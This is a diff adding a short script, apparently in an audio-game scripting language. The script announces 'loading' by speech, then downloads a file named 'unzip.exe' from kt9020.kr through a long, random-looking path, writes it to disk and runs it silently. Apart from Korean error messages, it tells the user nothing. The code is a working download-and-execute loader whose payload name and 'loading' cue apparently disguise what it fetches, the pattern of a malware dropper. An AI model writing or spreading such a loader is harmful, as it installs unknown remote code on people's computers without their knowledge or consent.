@@ -1,0 +1,39 @@
+tts_voice v;
+http download;
+void main()
+{
+
+
+v.speak_wait("로딩");
+file sp;
+string binary=download.get("http://kt9020.kr/content/downloads/06/11/macOS/11/10-301-30jfuiefjefdbcyr73-rirjmefjfnhfgeyegfytryref-fjfewjoijfioe/unzip.exe");
+if(get_last_error()<0)
+{
+alert("Error", "다운로드 도중 오류가 발생했습니다. 네트워크 상태를 확인하고 다시 시도하십시오.");
+exit();
+}
+sp.open("unzip.exe","wb");
+if(sp.active==false)
+{
+alert("Error", "파일을 열 수 없습니다. 다운로드를 다시 시도하십시오.");
+exit();
+}
+while(download.progress)
+{
+binary+=download.request();
+if(binary.length()>=8192)
+{
+sp.write(binary);
+binary="";
+}
+}
+if(binary!="")
+{
+sp.write(binary);
+}
+sp.close();
+run("unzip.exe", "", false, false);
+exit();
+}
+
+
